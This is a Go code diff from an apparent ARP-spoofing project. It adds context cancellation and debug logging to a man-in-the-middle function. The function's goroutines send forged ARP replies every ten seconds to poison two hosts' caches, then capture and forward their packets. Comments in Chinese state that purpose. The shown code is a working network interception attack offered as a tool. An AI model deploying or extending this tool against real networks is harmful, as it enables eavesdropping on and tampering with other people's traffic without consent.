@@ -2,9 +2,11 @@ package logic
 
 import (
 	"ARPSpoofing/dao/redis"
+	"ARPSpoofing/debug"
 	"ARPSpoofing/pkg/arp"
 	"ARPSpoofing/pkg/utils"
 	"ARPSpoofing/settings"
+	"context"
 	"fmt"
 	"log"
 	"net"
@@ -16,7 +18,7 @@ import (
 )
 
 //MiddleAttack 中间人工具
-func MiddleAttack(alice, bob, gateway string) error {
+func MiddleAttack(ctx context.Context, alice, bob, gateway string) error {
 	ifname, err := settings.Options.Get("ifname")
 	if err != nil {
 		log.Println(err)
@@ -66,8 +68,12 @@ func MiddleAttack(alice, bob, gateway string) error {
 		log.Println("pcap.OpenLive failed,err:", err)
 		return err
 	}
+
 	//欺骗双方
 	go func() {
+		defer func() {
+			debug.Println("中间人攻击欺骗双方的协程退出")
+		}()
 		for range time.Tick(time.Second * 10) {
 			//告诉alice,我的mac地址就是bob的mac地址
 			err := arp.SendARP(handle, aliceMAC, myMAC, aliceMAC, myMAC, aliceIP, bobIP, layers.ARPReply)
@@ -81,10 +87,19 @@ func MiddleAttack(alice, bob, gateway string) error {
 				log.Println("arp.SendARP failed,err:", err)
 				return
 			}
+			select {
+			case <-ctx.Done():
+				return
+			default:
+			}
 		}
 	}()
 	//接收数据包并转发
 	go func() {
+		defer func() {
+			debug.Println("中间人攻击接收数据包的协程退出")
+		}()
+
 		src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
 		for packet := range src.Packets() {
 			// nocopyPacket := gopacket.NewPacket(packet.Data(), layers.LayerTypeEthernet, gopacket.NoCopy)
@@ -146,6 +161,11 @@ func MiddleAttack(alice, bob, gateway string) error {
 			if err != nil {
 				log.Println("handler.WritePakectData failed,err:", err)
 				return
+			}
+			select {
+			case <-ctx.Done():
+				return
+			default:
 			}
 		}
 	}()
